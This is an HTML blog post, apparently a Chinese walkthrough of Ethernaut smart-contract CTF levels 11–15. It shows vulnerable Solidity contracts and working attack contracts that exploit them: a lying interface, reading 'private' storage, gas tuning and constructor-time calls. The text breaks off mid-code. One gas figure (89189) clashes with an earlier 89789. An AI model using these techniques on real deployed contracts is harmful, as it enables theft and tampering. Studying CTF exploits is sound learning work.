@@ -1,0 +1,901 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.0.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.0.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.0.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.0.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.0.4" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '6.0.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  
+  <meta name="keywords" content="Solidity,Ethereum,Blockchain," />
+
+
+<meta name="description" content="11. Elevator通关条件将目标合约的 top 字段修改为 true 目标合约12345678910111213141516171819pragma solidity ^0.5.0;interface Building &amp;#123;  function isLastFloor(uint) external returns (bool);&amp;#125;contract Elevator &amp;#12">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ethernaut 题解（11-21）">
+<meta property="og:url" content="http://yoursite.com/2020/11/15/ethernaut-workthrough-11-21/index.html">
+<meta property="og:site_name" content="Lanford33">
+<meta property="og:description" content="11. Elevator通关条件将目标合约的 top 字段修改为 true 目标合约12345678910111213141516171819pragma solidity ^0.5.0;interface Building &amp;#123;  function isLastFloor(uint) external returns (bool);&amp;#125;contract Elevator &amp;#12">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/uploads/solidityGasOpcode.png">
+<meta property="article:published_time" content="2020-11-14T17:28:46.000Z">
+<meta property="article:modified_time" content="2020-12-01T02:00:49.638Z">
+<meta property="article:author" content="Lanford33">
+<meta property="article:tag" content="Solidity">
+<meta property="article:tag" content="Ethereum">
+<meta property="article:tag" content="Blockchain">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/uploads/solidityGasOpcode.png">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/11/15/ethernaut-workthrough-11-21/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+  <title>Ethernaut 题解（11-21） | Lanford33</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"> <div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Lanford33</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">来写点东西吧！</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+  
+
+
+
+ </div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/15/ethernaut-workthrough-11-21/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lanford33">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lanford33">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Ethernaut 题解（11-21）</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-11-15T01:28:46+08:00">2020-11-15</time>
+            
+
+            
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Coding/" itemprop="url" rel="index"><span itemprop="name">Coding</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="11-Elevator"><a href="#11-Elevator" class="headerlink" title="11. Elevator"></a>11. Elevator</h2><h3 id="通关条件"><a href="#通关条件" class="headerlink" title="通关条件"></a>通关条件</h3><p>将目标合约的 top 字段修改为 true</p>
+<h3 id="目标合约"><a href="#目标合约" class="headerlink" title="目标合约"></a>目标合约</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">isLastFloor</span>(<span class="params">uint</span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">bool</span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">Elevator</span> </span>&#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">goTo</span>(<span class="params">uint _floor</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>
+
+<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>可以看到按照目标合约的逻辑，如果 <code>building.isLastFloor(_floor)</code> 为 true，函数将无法修改 top 的值。注意到 <code>building.isLastFloor/1</code> 执行了两次，那么我们只需要让这个函数两次执行返回不一样的结果就好。攻击合约如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract HackBuilding is Building &#123;</span><br><span class="line"></span><br><span class="line">    Elevator e;</span><br><span class="line"></span><br><span class="line">    bool isCalled = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(Elevator _addr) public &#123;</span><br><span class="line">        e = _addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isLastFloor</span>(<span class="params">uint</span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        bool result = isCalled;</span><br><span class="line">        isCalled = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">goTo</span>(<span class="params">uint _floor</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        e.goTo(_floor);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>合约部署后，调用 goTo(任意楼层）即可。</p>
+<h2 id="12-Privacy"><a href="#12-Privacy" class="headerlink" title="12. Privacy"></a>12. Privacy</h2><h3 id="通关条件-1"><a href="#通关条件-1" class="headerlink" title="通关条件"></a>通关条件</h3><p>解锁目标合约</p>
+<h3 id="目标合约-1"><a href="#目标合约-1" class="headerlink" title="目标合约"></a>目标合约</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked = <span class="literal">true</span>;</span><br><span class="line">  uint256 public ID = block.timestamp;</span><br><span class="line">  uint8 private flattening = <span class="number">10</span>;</span><br><span class="line">  uint8 private denomination = <span class="number">255</span>;</span><br><span class="line">  uint16 private awkwardness = uint16(now);</span><br><span class="line">  bytes32[<span class="number">3</span>] private data;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(bytes32[3] memory _data) public &#123;</span><br><span class="line">    data = _data;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">unlock</span>(<span class="params">bytes16 _key</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(_key == bytes16(data[<span class="number">2</span>]));</span><br><span class="line">    locked = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    A bunch of super advanced solidity algorithms...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`</span></span><br><span class="line"><span class="comment">      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,</span></span><br><span class="line"><span class="comment">      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\</span></span><br><span class="line"><span class="comment">      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)</span></span><br><span class="line"><span class="comment">      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><p>和第八题一样的解法。</p>
+<p>合约存储布局如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1 byte, slot 0</span></span><br><span class="line">bool public locked = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">// 32 bytes, slot 1</span></span><br><span class="line">uint256 public ID = block.timestamp;</span><br><span class="line"><span class="comment">// 1 byte, slot 2</span></span><br><span class="line">uint8 private flattening = <span class="number">10</span>;</span><br><span class="line"><span class="comment">// 1 byte, slot 2</span></span><br><span class="line">uint8 private denomination = <span class="number">255</span>;</span><br><span class="line"><span class="comment">// 2 byte, slot 2</span></span><br><span class="line">uint16 private awkwardness = uint16(now);</span><br><span class="line"><span class="comment">// bytes32[0], 32 bytes, slot 3; bytes32[1], 32 bytes, slot 4; bytes32[2], 32 bytes, slot 5</span></span><br><span class="line">bytes32[<span class="number">3</span>] private data;</span><br></pre></td></tr></table></figure>
+
+<p>所以我们要获得 data 就可以：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="number">5</span>);</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是，要解锁合约的 <code>_key</code> 是 bytes16 类型的，而 data 是 bytes32 类型的，bytes32 转换到 bytes 16 会截断超出的 bytes，也就是我们只取前 16 个 bytes 就好。</p>
+<h2 id="13-Gatekeeper-One"><a href="#13-Gatekeeper-One" class="headerlink" title="13. Gatekeeper One"></a>13. Gatekeeper One</h2><h3 id="通关条件-2"><a href="#通关条件-2" class="headerlink" title="通关条件"></a>通关条件</h3><p>通过目标合约所有 modifier 的检查，设置目标合约的 entrant 字段</p>
+<h3 id="目标合约-2"><a href="#目标合约-2" class="headerlink" title="目标合约"></a>目标合约</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'openzeppelin-solidity/contracts/math/SafeMath.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    <span class="built_in">require</span>(gasleft().mod(<span class="number">8191</span>) == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      <span class="built_in">require</span>(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), <span class="string">"GatekeeperOne: invalid gateThree part one"</span>);</span><br><span class="line">      <span class="built_in">require</span>(uint32(uint64(_gateKey)) != uint64(_gateKey), <span class="string">"GatekeeperOne: invalid gateThree part two"</span>);</span><br><span class="line">      <span class="built_in">require</span>(uint32(uint64(_gateKey)) == uint16(tx.origin), <span class="string">"GatekeeperOne: invalid gateThree part three"</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">enter</span>(<span class="params">bytes8 _gateKey</span>) <span class="title">public</span> <span class="title">gateOne</span> <span class="title">gateTwo</span> <span class="title">gateThree</span>(<span class="params">_gateKey</span>) <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h3><p>要通过 gateOne 很容易，使用中间合约调用 enter 即可</p>
+<p>要通过 gateThree 也挺简单：</p>
+<ol>
+<li>part one 说明 4 字节的 <code>_gateKey</code> 和 2 字节的 <code>_gateKey</code> 是相同的</li>
+<li>part two 说明 4 字节的 <code>_gateKey</code> 和 8 字节的 <code>_gateKey</code> 是不同的</li>
+<li>part three 说明 4 字节的 <code>_gateKey</code> 和 2 字节的 <code>tx.origin</code> 是相同的</li>
+</ol>
+<p>又有：</p>
+<p>uint16(address) 的转换会保留 address 最后两个字节，由上述 1，3 可得，<code>uint32(uint64(_gateKey))</code> 等于 <code>uint32(tx.origin) &amp; 0x0000FFFF</code>。再结合上述 2，只要 <code>_gateKey</code> 的最后 4 个字节为 <code>uint32(tx.origin) &amp; 0x0000FFFF</code>，其前面的 4 个字节可以为全 0 外的任意值。我们这里直接取 player 地址的最后八个字节，然后将其第 5，6 个字节替换为 0 得到 <code>_gateKey</code>。</p>
+<p>此题最麻烦的就是 gateTwo，要求执行到 gateTwo 的时候，剩余的 gas 对 8191 取模为 0。我们先部署一个攻击合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">contract HackGateOne &#123;</span><br><span class="line"></span><br><span class="line">    GatekeeperOne g;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(address _addr) public &#123;</span><br><span class="line">        g = GatekeeperOne(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hack</span>(<span class="params">bytes8 _gateKey, uint256 _gasAmount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        (bool result, ) = address(g).call.gas(_gasAmount)(abi.encodeWithSignature(<span class="string">"enter(bytes8)"</span>, _gateKey));</span><br><span class="line">        <span class="built_in">require</span>(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用 <code>_gasAmount = 90000</code> 尝试 hack 一下。交易失败后可以通过 etherscan 查看 Geth trace，找出 GAS opcode（gasleft() 的 opcode）的位置，得到：</p>
+<p><img src="/uploads/solidityGasOpcode.png" alt="image.png"></p>
+<p>可见执行到 gasleft() 的时候还剩余 89791 gas，gasleft() 本身又消耗 2 gas，所以本次合约执行 <code>gasleft() == 89789</code>。我们的目标是让 <code>gasleft() == 81910</code>，所以 <code>_gasAmount</code> 调整为 <code>90000 - (89189 - 81910) = 82121</code>，再次提交后成功过关。</p>
+<p>*在 remix 中可以通过 Debug 看到 gas 消耗情况，但是或许由于目标合约的编译器版本和编译器设置和本地环境有所区别，所以得到的结果并不准确。</p>
+<h2 id="14-Gatekeeper-Two"><a href="#14-Gatekeeper-Two" class="headerlink" title="14. Gatekeeper Two"></a>14. Gatekeeper Two</h2><h3 id="通关条件-3"><a href="#通关条件-3" class="headerlink" title="通关条件"></a>通关条件</h3><p>通过目标合约所有 modifier 的检查，设置目标合约的 entrant 字段</p>
+<h3 id="目标合约-3"><a href="#目标合约-3" class="headerlink" title="目标合约"></a>目标合约</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; <span class="attr">x</span> := extcodesize(caller) &#125;</span><br><span class="line">    <span class="built_in">require</span>(x == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    <span class="built_in">require</span>(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(<span class="number">0</span>) - <span class="number">1</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">enter</span>(<span class="params">bytes8 _gateKey</span>) <span class="title">public</span> <span class="title">gateOne</span> <span class="title">gateTwo</span> <span class="title">gateThree</span>(<span class="params">_gateKey</span>) <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题过程-3"><a href="#解题过程-3" class="headerlink" title="解题过程"></a>解题过程</h3><p>gateOne： 同上一题</p>
+<p>gateTwo：要求调用者的 extcodesize 为 0，看起来和 gateOne 冲突了，因为 gateOne 要求通过中间合约调用目标合约，但是中间合约的 codesize 是必然大于 0 的。查阅<a href="https://ethereum.stackexchange.com/a/14016" target="_blank" rel="noopener">资料</a>后得知，如果在中间合约的 constructor 中调用目标合约，此时中间合约的 extcodesize 为 0。</p>
+<p>gateThree：异或运算具有自反性，即 A XOR B XOR B = A XOR 0 = A，所以 <code>bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1))</code></p>
+<p>由上述可得攻击合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">contract HackGateTwo &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(address _addr) public &#123;</span><br><span class="line">        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(<span class="keyword">this</span>))))) ^ (uint64(<span class="number">0</span>) - <span class="number">1</span>));</span><br><span class="line">        (bool success, ) = _addr.call(abi.encodeWithSignature(<span class="string">"enter(bytes8)"</span>, _gateKey));</span><br><span class="line">        <span class="built_in">require</span>(success);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="15-Naught-Coin"><a href="#15-Naught-Coin" class="headerlink" title="15. Naught Coin"></a>15. Naught Coin</h2><h3 id="通关条件-4"><a href="#通关条件-4" class="headerlink" title="通关条件"></a>通关条件</h3><p>目标合约是一个 ERC20 代币合约，玩家的合约被锁仓十年。绕过锁仓限制提取资金即可通关</p>
+<h3 id="目标合约-4"><a href="#目标合约-4" class="headerlink" title="目标合约"></a>目标合约</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'openzeppelin-solidity/contracts/token/ERC20/ERC20Detailed.sol'</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">'openzeppelin-solidity/contracts/token/ERC20/ERC20.sol'</span>;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20, ERC20Detailed &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// string public constant name = 'NaughtCoin';</span></span><br><span class="line">  <span class="comment">// string public constant symbol = '0x0';</span></span><br><span class="line">  <span class="comment">// uint public constant decimals = 18;</span></span><br><span class="line">  uint public timeLock = now + <span class="number">10</span> * <span class="number">365</span> days;</span><br><span class="line">  uint256 public INITIAL_SUPPLY;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(address _player)</span><br><span class="line">  ERC20Detailed('NaughtCoin', '0x0', 18)</span><br><span class="line">  ERC20()</span><br><span class="line">  public &#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    INITIAL_SUPPLY = <span class="number">1000000</span> * (<span class="number">10</span>**uint256(decimals()));</span><br><span class="line">    <span class="comment">// _totalSupply = INITIAL_SUPPLY;</span></span><br><span class="line">    <span class="comment">// _balances[player] = INITIAL_SUPPLY;</span></span><br><span class="line">    _mint(player, 